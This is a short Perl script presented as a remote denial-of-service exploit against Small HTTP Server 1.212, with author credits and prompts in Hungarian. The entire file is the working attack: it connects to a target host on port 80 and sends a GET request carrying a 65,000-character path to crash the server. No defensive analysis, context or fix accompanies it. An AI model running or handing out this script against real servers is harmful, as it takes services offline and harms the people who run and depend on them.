#!/usr/bin/perl
# Small HTTP Server 1.212 RemoTe DoS Exploit by Zucco
# Zucco - Crewlez
# zucco@netposta.net
# Bug found by USSR Labs
use IO::Socket;

if (!$ARGV[0]) {
  print "Hasznald: $0 [host]\n\n";
  exit;
}

sub konnekt {
        $host = IO::Socket::INET->new ( Proto => "tcp",
			                PeerAddr => $ARGV[0],
                			PeerPort => "80",) or die "Nem tudok konnektolni $ARGV[0] -ra!\n";
        $host->autoflush(1);
} 

$buff .= "a" x 65000; 

print "Nah nezzuk..\n";
&konnekt; 
print $host "GET /$buff\n";
print "Done.\n";
close $host;